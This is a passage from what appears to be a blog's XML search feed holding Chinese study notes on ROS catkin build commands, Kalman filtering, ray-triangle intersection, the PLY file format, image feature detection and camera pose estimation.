      </tags>
  </entry>
  <entry>
    <title><![CDATA[ROS编译命令catkin简析]]></title>
    <url>%2F2019%2F06%2F06%2FROS%E7%BC%96%E8%AF%91%E5%91%BD%E4%BB%A4catkin%E7%AE%80%E6%9E%90%2F</url>
    <content type="text"><![CDATA[目前编译ROS的Package有两种方法： catkin_make catkin build catkin_makecatkin_make 是一个命令行工具，它简化了catkin的标准工作流程。你可以认为catkin_make是在CMake标准工作流程中依次调用了cmake 和 make。 使用方法如下： 12# 在catkin工作空间下$ catkin_make [make_targets] [-DCMAKE_VARIABLES=...] catkincatkin是一个用于处理catkin元构建系统和catkin工作区的命令行工具。其用法如下： 1234567891011`catkin VERB -h` for help on each verb listed below: build Builds a catkin workspace. clean Deletes various products of the build verb. config Configures a catkin workspace&apos;s context. create Creates catkin workspace resources like packages. env Run an arbitrary command in a modified environment. init Initializes a given folder as a catkin workspace. list Lists catkin packages in the workspace or other arbitray folders. locate Get the paths to various locations in a workspace. profile Manage config profiles for a catkin workspace. 同样可使用catkin build命令编译ROS的package。 catkin_make与catkin build的区别与catkin_make不同，catkin命令行工具不仅仅是围绕cmake和make命令的瘦包装器。 catkin build命令隔离地在工作空间的源空间中构建每个包，以防止构建时串扰。 因此，在其最简单的用法中，catkin构建的行为类似于catkin_make_isolated的并行化版本。 参考链接 Migrating from catkin_make,by catkin_tools homepage. 编译ROS程序包,by ros wiki.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>ROS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[卡尔曼滤波入门]]></title>
    <url>%2F2019%2F06%2F04%2F%E5%8D%A1%E5%B0%94%E6%9B%BC%E6%BB%A4%E6%B3%A2%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[卡尔曼滤波（Kalman filter）是一种高效率的递归滤波器（自回归滤波器），它能够从一系列的不完全及包含噪声的测量中，估计动态系统的状态。卡尔曼滤波会根据各测量量在不同时间下的值，考虑各时间下的联合分布，再产生对未知变数的估计，因此会比只以单一测量量为基础的估计方式要准。卡尔曼滤波得名自主要贡献者之一的鲁道夫·卡尔曼。 卡尔曼滤波在技术领域有许多的应用。常见的有飞机及太空船的导引、导航及控制。卡尔曼滤波也广为使用在时间序列的分析中，例如信号处理及计量经济学中。卡尔曼滤波也是机器人运动规划及控制的重要主题之一，有时也包括在轨迹最佳化。卡尔曼滤波也用在中轴神经系统运动控制的建模中。因为从给与运动命令到收到感觉神经的回授之间有时间差，使用卡尔曼滤波有助于建立符合实际的系统，估计运动系统的目前状态，并且更新命令。 卡尔曼滤波原理解析卡尔曼滤波器的状态矩阵方程如图1所示。 图1 卡尔曼滤波器的状态矩阵方程 其中，下角标上的k是状态。此处我们将其视为离散时间间隔，比如说k=1 代表 1ms, k=2 代表2ms。 我们的目的是找到信号 $x$ 的估值 $\hat{x} $，并且希望能对所有的k值都能找到对应的估值。 另外此处的 $Z_k$ 是实际测量值，记住我们对该值并不完全信任，否则我们也不用费这么多事了。 $K_k$ 称为卡尔曼增益（也是最重要的量）， $\hat{x}_k$ 是前一状态下的信号估值。 现在我们有了测量值，前一状态的信号估值。该方程中唯一未知的量就是卡尔曼增益 $K_k$ 了。对于每个状态，我们都需要计算对应的。这事不简单，但好在我们有所需的计算工具。 另一方面，假设 $K_k$ 等于0.5，我们会发现该式变成了一个简单的求平均值公式。换句话说，随着状态的变化，我们的 $K_k$ 值将越来越“聪明”。 卡尔曼滤波器的构造建立模型此步最为关键，你必须确保卡尔曼滤波器适用于你要解决的问题。 卡尔曼滤波器的两个方程如下: x_k=Ax_{k-1}+Bu_k+w_{k-1} \tag{1}z_k=Hx_k+v_k \tag{2}式(1)表达的是每个 $x_k$ 都可以通过一个线性随机方程估计出来。任意 $x_k$ 都是其前一时刻的值与过程噪音的线性组合（这个很难概念化）。请记住，大部分情况下该式没有控制信号 $u_k$ 项。 式(2)告诉我们任何测量值 $z_k$ （无法确定精确与否的测量值）都是信号值与测量噪声的线性组合。这两个分量符合高斯分布。 过程噪声与测量噪声互相统计独立。 $A, B, H$ 是一般形式的矩阵。但在大多数信号处理问题中，这些量仅为数值。而且虽然这些值在状态变换时会改变，大多数情况下我们都可以假设他们为定值。 如果我们十分确定我们的系统符合此模型，那么唯一剩下要做的事就是估计噪音函数 $w_{k-1}$ 和 $v_k$ 的平均值以及标准差。我们知道，在实际生活中没有信号满足高斯分布，但我们可以近似其为高斯分布。 该近似问题不大，因为我们将看到卡尔曼滤波器算法会逐渐向正确的（噪音函数的）估计值收敛，即使高斯噪声参数估计不佳。 唯一需要记住的是：你估计出来的噪音参数越好（越接近实际），你估计的（输出真实值）就越好。 开始卡尔曼滤波如果你的模型适用于卡尔曼滤波器，那么接下来的步骤就是决定一些必要的参数以及初始值。 卡尔曼滤波器包含的方程可分为两个方程集：时间更新方程组（用于预测）以及测量更新方程组（用于修正）。这两个方程组在滤波器运行的每一步（每个状态）下都会执行，如图2所示。 图2 卡尔曼滤波的两个步骤 建模部分已经在步骤一完成了，所以矩阵A，B和H已知。这些矩阵很可能是一个常数，而且大部分情况下会等于1。 剩下的最让人难受的部分就是决定R和Q的值了。R的值还是很容易找的，因为一般情况下我们对环境中的噪音还是能够确认的。（起码能用仪器测一下）。但是找Q的值就没那么直观了。 为了使滤波器能够运行，我们需要知道 $x_0$ 和 $P_0$ 的估计值。 迭代在获得了滤波器运行所需的所有信息后，我们就可以估值迭代了。记住：前一状态的估值将成为当前状态的输入。 图3 卡尔曼滤波的迭代运行 此处 $\hat{x}_k^-$ 是预估值，从某种角度来说是第二部分运行前对 x 的一个粗略估计值。 同时 $P_k^-$ 叫做预估误差协方差。在第二步“测量更新”中我们将会用到这两个预估值。 $\hat{x}_k$为在时间 k 时的 x 的估计值。（也是我们最想获得的值）。同时，我们得到了用于k+1时刻计算的 $P_k$ 值。 下一次迭代不会用到我们求得的卡尔曼增益 $K_k$ 的值，该值隐藏而神秘，并且是这些方程集的最重要的部分。 我们在第二步“测量更新”中求得的值也叫做后部值(posterior values)。这个名称也很说得通。 卡尔曼滤波器的应用示例参考链接 卡尔曼滤波：从入门到精通,by David LEE. 傻瓜也能懂的卡尔曼滤波器（翻译自外网博客）,by 彦鑫. 说说卡尔曼滤波,by 李阳. 卡尔曼滤波,by wikipedia. 图说卡尔曼滤波，一份通俗易懂的教程,by 论智.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[求解射线与三角形交点的算法]]></title>
    <url>%2F2019%2F06%2F04%2F%E6%B1%82%E8%A7%A3%E5%B0%84%E7%BA%BF%E4%B8%8E%E4%B8%89%E8%A7%92%E5%BD%A2%E4%BA%A4%E7%82%B9%E7%9A%84%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[求解射线与三角形的交点，在光线追踪、碰撞检测、目标拾取等场景中经常使用，是计算机图形学中最基本的操作。下面介绍常用的求解射线与三角形交点的算法。 问题定义求解射线与三角形交点示意图如图1所示。 图1 求解射线与三角形交点示意图 射线的参数方程如下，其中O是射线的起点，D是射线的方向，t是常数。 O+Dt该方程的含义是一个点从起点O开始，沿着方向D移动任意长度，得到终点R，根据t值的不同，得到的R值也不同，所有这些不同的R值便构成了整条射线，比如下面的射线，起点是P0，方向是u，p0 + tu也就构成了整条射线。 图2 射线方程示意图 三角形的参数方程如下，其中$V_0$，$V_1$和$V_2$是三角形的三个点，$u, v$是$V_1$和$V_2$的权重，$1-u-v$是$V_0$的权重，并且满足$u&gt;=0, v &gt;= 0,u+v&lt;=1$。 (1-u-v)V_0+uV_1+vV_2 图3 三角形方程示意图 直观方法求解射线与三角形的交点最直观的方法如下： 判断射线是否与平面相交 判断点是否在三角形内 但该方法需要额外计算三角形所在平面，效率不高。 Moller-Trumbore方法(Journal of Graphic Tools, 1997)Moller-Trumbore方法中，求射线与三角形的交点即求解如下方程: O+Dt=(1-u-v)V_0+uV_1+vV_2其中t,u,v是未知数，其他都是已知的。 移项并整理，将t,u,v提取出来作为未知数，得到下面的线性方程组： \begin{bmatrix} -D& V_1-V_0 &V_2-V_0 \end{bmatrix}\begin{bmatrix} t\\u\\v \end{bmatrix}=O-V_0现在开始解这个方程组，这里要用到两个知识点，一是克莱姆法则，二是向量的混合积。 令$E_1 = V_1 - V_0，E_2 = V_2 - V_0，T = O - V_0$上式可以改写成: \begin{bmatrix} -D& E_1 & E_2 \end{bmatrix}\begin{bmatrix} t\\u\\v \end{bmatrix}=T根据克莱姆法则，可得到t,u,v的解为： \begin{bmatrix} t\\u\\v \end{bmatrix} =\frac{1}{\begin{vmatrix} -D & E_1 & E_2 \end{vmatrix} } \begin{vmatrix} T&E_1&E_2\\ -D& T& E_2\\ -D & E_1& T \end{vmatrix}根据混合积公式: \begin{vmatrix} a&b&c \end{vmatrix} =a\times{b}\cdot{c}上式改写为： \begin{bmatrix} t\\u\\v \end{bmatrix} =\frac{1}{\begin{bmatrix} -D \times E_2 \cdot E_1 \end{bmatrix} } \begin{vmatrix} T \times E_1 \cdot E_2\\ D \times E_2 \cdot T\\ T \times E_1 \cdot D \end{vmatrix}令$P=D \times E_2$，$Q=T \times E_1$，得到最终的公式: \begin{bmatrix} t\\u\\v \end{bmatrix} =\frac{1}{\begin{bmatrix} P \cdot E_1 \end{bmatrix} } \begin{vmatrix} Q \cdot E_2\\ P \cdot T\\ Q \cdot D \end{vmatrix}之所以提炼出P和Q是为了避免重复计算。 参考链接 射线和三角形的相交检测（ray triangle intersection test）,by zdd. 光线-三角形求交测试算法[译], by PKUWWT. 克莱姆法则,by wikipedia. 混合积,by wikipedia. 重心坐标,by wikipedia. 重心坐标（Barycentric coordinates）,by 杨超.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机图形学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PLY文件格式分析]]></title>
    <url>%2F2019%2F06%2F04%2FPLY%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[PLY文件是一种存储3D模型的文件格式，全名为多边形档案（Polygon File Format）或 史丹佛三角形档案（Stanford Triangle Format）。 该格式主要用以储存立体扫描结果的三维数值，透过多边形片面的集合描述三维物体，与其他格式相较之下这是较为简单的方法。它可以储存的资讯包含颜色、透明度、表面法向量、材质座标与资料可信度，并能对多边形的正反两面设定不同的属性。 在档案内容的储存上PLY有两种版本，分别是纯文字（ASCII）版本与二元码（binary）版本，其差异在储存时是否以ASCII编码表示元素资讯。 通过分析PLY文件格式，我们可以进而初窥存储3D模型的文件奥秘。 文件格式各种文件格式通常分成文件头和文件内容，PLY格式也不例外。 每个PLY档都包含档头（header），用以设定网格模型的“元素”与“属性”，以及在档头下方接着一连串的元素“数值资料”。一般而言，网格模型的“元素”就是顶点（vertices）、面（faces），另外还可能包含有边（edges）、深度图样本（samples of range maps）与三角带（triangle strips）等元素。无论是纯文字与二元码的PLY档，档头资讯都是以ASCII编码编写，接续其后的数值资料才有编码之分。 PLY档案以此行作为开头，以识别PLY格式： 1ply 接着第二行是版本资讯，目前有三种写法： 123format ascii 1.0format binary_little_endian 1.0format binary_big_endian 1.0 其中ascii, binary_little_endian, binary_big_endian是档案储存的编码方式，而1.0是遵循的标准版本（现阶段仅有PLY 1.0版）。在档头中可使用’comment’作为一行的开头以编写注解，例如： 1comment This is a comment! 描述元素及属性，必须使用’element’及’property’的关键字，一般的格式为element下方接着属性列表，例如: 1234element &lt;element name&gt; &lt;number in file&gt;property &lt;data_type&gt; &lt;property name 1&gt;property &lt;data_type&gt; &lt;property name 2&gt;property &lt;data_type&gt; &lt;property name 3&gt; ‘property’不仅定义了资料的型态，其出现顺序亦定义了资料的顺序。内定的资料形态有两种写法：一种是char uchar short ushort int uint float double,另外一种是具有位元长度的int8 uint8 int16 uint16 int32 uint32 float32 float64。 例如，描述一个包含12个顶点的物体，每个顶点使用3个单精度浮点数 (x,y,z）代表点的座标，使用3个unsigned char代表顶点颜色，颜色顺序为 (B, G, R),则档头的写法为： 1234567element vertex 12property float xproperty float yproperty float zproperty uchar blueproperty uchar greenproperty uchar red 其中vertex是内定的元素类型，接续的6行property描述构成vertex元素的数值字段顺序代表的意义，及其资料形态。 另一个常使用的元素是面。由于一个面是由3个以上的顶点所组成，因此使用一个“顶点列表”即可描述一个面, PLY格式使用一个特殊关键字’property list’定义之。 例如，一个具有10个面的物体，其PLY档头可能包含： 12element face 10property list uchar int vertex_indices ‘property list’表示该元素face的特性是由一行的顶点列表来描述。列表开头以uchar型态的数值表示列表的项目数，后面接着资料型态为int的顶点索引值（vertex_indices），顶点索引值从0开始。 最后，标头必须以此行结尾： 1end_header 档头后接着的是元素资料（端点座标、拓朴连结等）。在ASCII格式中各个端点与面的资讯都是以独立的一行描述，而二元编码格式则连续储存这些资料，载入时须以’element’定义的元素数目以及’property’中设定的资料形态计算各笔字段的长度。 示例一个典型的PLY文件结构分成三部分： 123文件头 (从ply开始到end_header）顶点元素列表面元素列表 其中的顶点元素列表一般以x y z方式排列，形态如文件头所定义；而面元素列表是以下列格式表示。 1&lt;组成面的端点數N&gt; &lt;端点#1的索引&gt; &lt;端点#2的索引&gt; ... &lt;端点#N的索引&gt; 以存储一个立方体模型的PLY文件为例，其内容为： 12345678910111213141516171819202122232425262728293031plyformat ascii 1.0comment made by anonymouscomment this file is a cubeelement vertex 8property float32 xproperty float32 yproperty float32 zelement face 12property list uint8 int32 vertex_indexend_header0 0 00 25.8 018.9 0 018.9 25.8 00 0 7.50 25.8 7.518.9 0 7.518.9 25.8 7.53 5 1 03 5 4 03 4 0 23 4 6 23 7 5 43 7 6 43 3 2 13 1 2 03 5 7 13 7 1 33 7 6 33 6 3 2 PLY文件可用blender软件打开。 参考链接 PLY,by wikipedia. Opengl学习笔记：（一）.Ply文件文件格式和文件读取,by 为何走到这里.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机图形学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[图像特征检测与描述]]></title>
    <url>%2F2019%2F06%2F02%2F%E5%9B%BE%E5%83%8F%E7%89%B9%E5%BE%81%E6%A3%80%E6%B5%8B%E4%B8%8E%E6%8F%8F%E8%BF%B0%2F</url>
    <content type="text"><![CDATA[特征检测（英语：Feature detection）是计算机视觉和图像处理中的一个概念。它指的是使用计算机提取图像信息，决定每个图像的点是否属于一个图像特征。特征检测的结果是把图像上的点分为不同的子集，这些子集往往属于孤立的点、连续的曲线或者连续的区域。 图像特征分类特征的精确定义往往由问题或者应用类型决定。特征是一个数字图像中“有趣”的部分，它是许多计算机图像分析算法的起点。因此一个算法是否成功往往由它使用和定义的特征决定。因此特征检测最重要的一个特性是“可重复性”：同一场景的不同图像所提取的特征应该是相同的。 特征检测是图象处理中的一个初级运算，也就是说它是对一个图像进行的第一个运算处理。它检查每个像素来确定该像素是否代表一个特征。假如它是一个更大的算法的一部分，那么这个算法一般只检查图像的特征区域。作为特征检测的一个前提运算，输入图像一般通过高斯模糊核在尺度空间中被平滑。此后通过局部导数运算来计算图像的一个或多个特征。 常用的图像特征分成以下四类： 边缘 边缘指组成两个图像区域之间边界（或边缘）的像素。一般一个边缘的形状可以是任意的，还可能包括交叉点。在实践中边缘一般被定义为图像中拥有大的梯度的点组成的子集。一些常用的算法还会把梯度高的点联系起来来构成一个更完善的边缘的描写。 角 角指图像中点似的特征，在局部它有两维结构。早期的算法首先进行边缘检测，然后分析边缘的走向来寻找边缘突然转向（角）。后来发展的算法不再需要边缘检测这个步骤，而是可以直接在图像梯度中寻找高度曲率。 区域 与角不同的是区域描写一个图像中的一个区域性的结构，但是区域也可能仅由一个像素组成，因此许多区域检测也可以用来监测角。一个区域监测器检测图像中一个对于角监测器来说太平滑的区域。 区域检测可以被想象为把一张图像缩小，然后在缩小的图像上进行角检测。 脊 长条形的物体被称为脊。在实践中脊可以被看作是代表对称轴的一维曲线，此外局部针对于每个脊像素有一个脊宽度。从灰梯度图像中提取脊要比提取边缘、角和区域困难。在空中摄影中往往使用脊检测来分辨道路，在医学图像中它被用来分辨血管。 边缘检测边缘检测（英语：Edge detection）是图像处理和计算机视觉中的基本问题，边缘检测的目的是标识数字图像中亮度变化明显的点。图像属性中的显著变化通常反映了属性的重要事件和变化。这些包括（i）深度上的不连续、（ii）表面方向不连续、（iii）物质属性变化和（iv）场景照明变化。 边缘检测是图像处理和计算机视觉中，尤其是特征检测中的一个研究领域。 图像边缘检测大幅度地减少了数据量，并且剔除了可以认为不相关的信息，保留了图像重要的结构属性。有许多方法用于边缘检测，它们的绝大部分可以划分为两类：基于查找一类和基于零穿越的一类。基于查找的方法通过寻找图像一阶导数中的最大和最小值来检测边界，通常是将边界定位在梯度最大的方向。基于零穿越的方法通过寻找图像二阶导数零穿越来寻找边界，通常是Laplacian过零点或者非线性差分表示的过零点。 边缘检测的方法有许多用于边缘检测的方法，他们大致可分为两类： 基于搜索的边缘检测 基于搜索的边缘检测方法首先计算边缘强度，通常用一阶导数表示，例如梯度模;然后，用计算估计边缘的局部方向，通常采用梯度的方向，并利用此方向找到局部梯度模的最大值. 基于零交叉的边缘检测 基于零交叉的方法找到由图像得到的二阶导数的零交叉点来定位边缘.通常用拉普拉斯算子或非线性微分方程的零交叉点，我们将在后面的小节中描述. 滤波做为边缘检测的预处理通常是必要的，通常采用高斯滤波. 已发表的边缘检测方法应用计算边界强度的度量，这与平滑滤波有本质的不同.正如许多边缘检测方法依赖于图像梯度的计算，他们用不同种类的滤波器来估计x-方向和y-方向的梯度. 角检测角检测（英语：Corner detection）或兴趣点检测（interest point detection），是计算机视觉系统中用来提取特征以及推测图像内容的一种方法.角检测的应用很广，经常用在运动检测，跟踪，图像镶嵌（image mosaicing），全景图缝合（panorama stiching），三维建模以及物体识别中. 问题定义两条边的交点形成一个角（点）。而图像的要点（也称为受关注点）是指图像中具有代表性以及稳健性（即指该点能够在有噪声干扰的情况下也能稳定的被定位，在大陆亦被称为：鲁棒性）的点。也就是说，要点可以是角（点），也可以不是，例如局部亮点或暗点，线段终点，或者曲线上的曲率最大值点。在实际应用中，很多所谓的（角）点检测算法其实是检测要点，而不仅仅是角（点）。所以，如果我们只想检测角的话，还需要对检测出的要点进一步分析。 角检测的方法在现实世界中，角点对应于物体的拐角，道路的十字路口、丁字路口等。从图像分析的角度来定义角点可以有以下两种定义： 角点可以是两个边缘的角点； 角点是邻域内具有两个主方向的特征点； 前者往往需要对图像边缘进行编码，这在很大程度上依赖于图像的分割与边缘提取，具有相当大的难度和计算量，且一旦待检测目标局部发生变化，很可能导致操作的失败。早期主要有Rosenfeld和Freeman等人的方法，后期有CSS等方法。 基于图像灰度的方法通过计算点的曲率及梯度来检测角点，避免了第一类方法存在的缺陷，此类方法主要有Moravec算子、Forstner算子、Harris算子、SUSAN算子等。 图1 角检测方法发展历程 Harris算法Harris角点检测基本原理如图2所示。人眼对角点的识别通常是在一个局部的小区域或小窗口完成的。如果在各个方向上移动这个特征的小窗口，窗口内区域的灰度发生了较大的变化，那么就认为在窗口内遇到了角点。如果这个特定的窗口在图像各个方向上移动时，窗口内图像的灰度没有发生变化，那么窗口内就不存在角点；如果窗口在某一个方向移动时，窗口内图像的灰度发生了较大的变化，而在另一些方向上没有发生变化，那么，窗口内的图像可能就是一条直线的线段。 图2 Harris角点检测基本原理 SIFT算法SIFT(Scale-invariant features transform, 尺度不变特征变换)是一种检测局部特征的算法，该算法通过求一幅图中的特征点（interest points,or corner points）及其有关scale 和 orientation 的描述子得到特征并进行图像特征点匹配，获得了良好效果。SIFT特征不只具有尺度不变性，即使改变旋转角度，图像亮度或拍摄视角，仍然能够得到好的检测效果。该算法由 David Lowe在1999年所发表，2004年完善总结。 SIFT算子是把图像中检测到的特征点用一个128维的特征向量进行描述，因此一幅图像经过SIFT算法后表示为一个128维的特征向量集，该特征向量集具有对图像缩放，平移，旋转不变的特征，对于光照、仿射和投影变换也有一定的不变性，是一种非常优秀的局部特征描述算法。 SIFT算法的流程分别为： 尺度空间极点检测 关键点精确定位 关键点的方向确定 特征向量的生成 ORB算法ORB的全称是ORiented Brief，是文章ORB: an efficient alternative to SIFT or SURF中提出的一种新的角点检测与特征描述算法。实际上，ORB算法是将FAST角点检测与BRIEF特征描述结合并进行了改进。 ORB特征由关键点和描述子两部分组成。它的关键点称为“Oriented Fast”，是一种改进的FAST角点。描述子称为“BRIEF(Binary Robust Independent Elementary Feature)”。因此提取ORB特征分为如下两个步骤： 提取FAST角点(相较于原版FAST角点，ORB中计算了特征点的主方向，为后续的BRIEF描述子增加了旋转不变性) 计算BRIEF描述子 参考链接 特征检测,by wikipedia. 边缘检测,by wikipedia. 角检测,by wikipedia. Harris角点,by Ronny. 特征点匹配——SIFT算法详解,by lhanchao. ORB特征提取、匹配及实现,by zhaoxuhui. 传统计算机视觉中图像特征匹配方法的原理介绍（SIFT 和 ORB）,by Zhang Bin.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机图形学</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[相机位姿估计入门]]></title>
    <url>%2F2019%2F05%2F29%2F%E7%9B%B8%E6%9C%BA%E4%BD%8D%E5%A7%BF%E4%BC%B0%E8%AE%A1%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[相机位姿估计是指给定若干图像，估计其中相机运动的问题。求解方法通常分特征点法和直接法两种。下面主要介绍特征点法。 特征点法的思路是先从图像当中提取许多特征，然后在图像间进行特征匹配，这样就得到许多匹配好的点，再根据这些点进行相机位姿的求解。根据传感器形式的不同，可以分成三种情况： 2D-2D，单目相机获取的影像，只能获得像素坐标 3D-3D配对点，RGBD或双目相机，可以获取深度信息 3D-2D，已知一张图中的3D信息，另一张图只有2D信息 问题分析在两帧各自的相机坐标系中，设P点的相机坐标系的坐标分别为$P_1$、$P_2$，如图1所示。 图1 相机位姿估计示意图 其中： P_{1}=\begin{pmatrix} X_{1}\\ Y_{1}\\ Z_{1} \end{pmatrix},P_{2}=\begin{pmatrix} X_{2}\\ Y_{2}\\ Z_{2} \end{pmatrix}相机从第一帧移动到第二帧，其旋转矩阵设为R，平移向量设为t。这里的R表示的旋转是相对于第一帧的姿态改变量。那么有: P_{2}=RP_{1}+t \tag{1}相机位姿估计的最终目的就是要根据这个运动方程，求解出相机的运动，也就是R、t。注意这里的R、t并不是相机外参！ 由于$P_1$、$P_2$的坐标未知，但其在像素坐标系的坐标$p_1$、$p_2$已知，因此，根据小孔成像模型寻找$p_1$、$p_2$和$P_1$、$P_2$之间的关系。 小孔成像模型小孔成像模型的示意图如图2所示。设P点在世界坐标系下坐标为$P_w$在相机坐标系下坐标为$P_c$，物理成像平面对应坐标为 $P’$, 像素平面对应坐标为p, 有： p=\begin{pmatrix} u\\ v \end{pmatrix},P^{'}=\begin{pmatrix} X^{'}\\ Y^{'}\\ Z^{'} \end{pmatrix},P_c=\begin{pmatrix} X_c\\ Y_c\\ Z_c \end{pmatrix},P_w=\begin{pmatrix} X_w\\ Y_w\\ Z_w \end{pmatrix} 图2 小孔成像模型示意图 根据小孔成像模型，有如下公式： \begin{pmatrix} u\\ v\\ 1 \end{pmatrix}=\frac{1}{Z_{c}}\begin{pmatrix} f_{x} & 0 & c_{x}\\ 0 & f_{y} & c_{y}\\ 0 & 0 & 1 \end{pmatrix}\begin{pmatrix} X_{c}\\ Y_{c}\\ Z_{c} \end{pmatrix} \tag{2}该公式给出了点P相机坐标系下坐标与像素平面坐标之间的关系。 2D-2D估计设相机内参矩阵为K，即 K=\begin{pmatrix} f_{x} & 0 & c_{x}\\ 0 & f_{y} & c_{y}\\ 0 & 0 & 1 \end{pmatrix}将公式(2)代入公式(1)，则 K^{-1}Z_{2}p_{2}=RK^{-1}Z_{1}p_{1}+t \tag{3}内参矩阵K短期内不变，但$Z_1$很明显一般情况下不等于$Z_2$，除非是相机绕着P点为圆心旋转。现在已知的是K、p1、p2，待求R，t。 然而这里还有$Z_1$、$Z_2$是未知的，因此必须想办法将$Z$消去。 将相机坐标系下坐标$P_c$归一化，即 P_{c}^{'}=\begin{pmatrix} {X_{c}}/{Z_{c}}\\ {Y_{c}}/{Z_{c}}\\ 1 \end{pmatrix}由公式(2)可得： \begin{pmatrix} u\\ v\\ 1 \end{pmatrix}=\begin{pmatrix} f_{x} & 0 & c_{x}\\ 0 & f_{y} & c_{y}\\ 0 & 0 & 1 \end{pmatrix}\begin{pmatrix} {X_{c}}/{Z_{c}}\\ {Y_{c}}/{Z_{c}}\\ 1 \end{pmatrix} =K\begin{pmatrix} {X_{c}}/{Z_{c}}\\ {Y_{c}}/{Z_{c}}\\ 1 \end{pmatrix} \tag{4}将公式(4)代入公式(1)，则有： K^{-1}p_{2}=RK^{-1}p_{1}+t这样便能求解了。但是也导致了一个问题，因为不同帧对应的相机坐标系中P的Z值并不相等。在实际操作中分别除以其本身从而将Z分量归一化为1，这其实就丢失了真实的位置信息，不同帧的缩放是不等的！从而导致2D-2D估计两两帧之间，每次估计的尺度都是不同的。这也就是单目SLAM的尺度不确定性。 通过2D-2D，最终可获得P点像素坐标 $p$ 对应相机坐标系下归一化坐标$P_{c}^{‘}$。 三角测量三角测量在三角学与几何学上是一借由测量目标点与固定基准线的已知端点的角度，测量目标距离的方法。而不是直接测量特定位置的距离（三边量测法）。当已知一个边长及两个观测角度时，观测目标点可以被标定为一个三角形的第三个点。 基于两固定角度之距离量测假设一量测目标点及两个已知座标的参考点可形成一个三角形，则借由计算三角形其中参考边的长度，量测两参考点与目标点形成的角度，即可找出目标点的距离及座标。 图3 基于两固定角度之距离量测示意图 三角测量可用来计算岸边与船只之间的距离及座标。A顶点的观察者测量岸边与船只之间的角度α，B点的观察者则依同理测量出角度β，由长度l或已知的A及B点座标，则可由正弦定理取得在C点船只的座标及距离d。 计算过程如下： \ell = \frac{d}{\tan \alpha} + \frac{d}{\tan \beta}根据三角恒等式${\displaystyle \tan \alpha ={\frac {\sin \alpha }{\cos \alpha }}}$和${\displaystyle \sin \left(\alpha +\beta \right)=\sin \alpha \cos \beta +\cos \alpha \sin \beta }$，此式可等于： {\displaystyle \ell =d\left({\frac {\cos \alpha }{\sin \alpha }}+{\frac {\cos \beta }{\sin \beta }}\right)}{\displaystyle \ell =d\ {\frac {\sin(\alpha +\beta )}{\sin \alpha \sin \beta }}}因此， {\displaystyle d=\ell \ {\frac {\sin \alpha \sin \beta }{\sin(\alpha +\beta )}}}由此便可简单定义出一未知点与观察点间的距离，以及与观察点往东西、南北向相差的位移量，终得完整座标。 2D-2D估计获得特征点在相机坐标系下的归一化3D坐标，结合三角测量，可获得特征点在相机坐标系下的深度，两者结合即获得特征点在相机坐标系下的3D坐标。 3D-2D估计3D-2D估计本质是PnP一个问题，即给定世界坐标系中n个3D点及其在图像中的相应2D投影的情况下，估计校准相机的姿势的问题。相机姿势由6个自由度（DOF）组成，其由旋转（滚动，俯仰和偏航）以及相机相对于世界的3D平移构成。该问题源于相机校准，并且在计算机视觉和其他领域中具有许多应用，包括3D姿态估计、机器人和增强现实。 对于n = 3，存在一个常用的问题解决方案，称为P3P，并且许多解决方案适用于n≥3的一般情况。 P3PP3P仅需要使用三对匹配点，就可以完成相机的位姿估计。 假设空间中有A,B,C三点，投影到成像平面中有a,b,c三点，在PnP问题中，A,B,C在世界坐标系下的坐标是已知的，但是在相机坐标系下的坐标是未知的。a,b,c的坐标是已知的。PnP的目的就是要求解A,B,C在相机坐标系下的坐标值。如下图所示。需要注意的是三角形abc和三角形ABC不一定是平行的。 图4 P3P问题示意图 根据余弦定理有： OA^2 + OB^2 - 2OA \cdot OB \cdot \cos(a,b) = AB^2 \\ OB^2 + OC^2 - 2OB \cdot OC \cdot \cos(b,c) = BC^2 \\ OA^2 + OC^2 - 2OA \cdot OC \cdot \cos(a,c) = AC^2记$x=\dfrac{OA}{OC}$,$y=\dfrac{OB}{OC}$，因为A,B,C在相机坐标系中的坐标未知，因此x，y是未知的。 另记$u=\dfrac{BC^2}{AB^2}$,$w=\dfrac{AC}{AB}$, 根据A,B,C的世界坐标，u,w是可以求出的。 通过一系列的转化可以得到两个等式： (1-u)y^2-ux^2-\cos(b,c)y+2uxy \cos(a,b) +1 = 0 \\ (1-w)x^2-wy^2-\cos(a,c)x+2wxy \cos(a,b) +1 = 0该方程组是关于x,y的一个二元二次方程，可以通过吴消元法求解。最多可能得到四个解，因此在三个点之外还需要一组匹配点进行验证。 至此，通过x和y就可以求得A，B，C在相机坐标下的坐标值。因此3D-2D问题转变成了3D-3D的位姿估计问题。而带有匹配信息的3D-3D位姿求解非常容易。 Bundle Adjustment假设某空间点坐标为$P_i = [X_i, Y_i, Z_i]$, 其投影的像素坐标为$p_i=[u_i,v_i]$。这些在PnP问题里都是已知的。在相机坐标系下有$c=[x_i, y_i, z_i]$，这个坐标通过P3P或者其他解法有了粗略的估计。根据针孔相机模型可得： z_i p_i = KTP_i = K \exp([\xi]_{\times})P_i根据这个等式可以构造出一个最小二乘问题： \xi^* = \arg \min \limits _{\xi} \dfrac{1}{2} \sum\limits _{i=1} ^n \begin{Vmatrix} p_i - \dfrac{1}{z_i} K \exp([\xi]_{\times})P_i \end{Vmatrix} _2 ^2该问题的误差项，是将像素坐标与3D点按照当前估计的位姿进行投影得到的位置相比较得到的误差，所以称之为重投影误差。如图5所示。 图5 重投影误差示意图 这个最小二乘问题主要优化两个变量，第一是对相机位姿的优化，也就是对李代数的优化，第二是对空间点P的优化，也就是P点的优化。 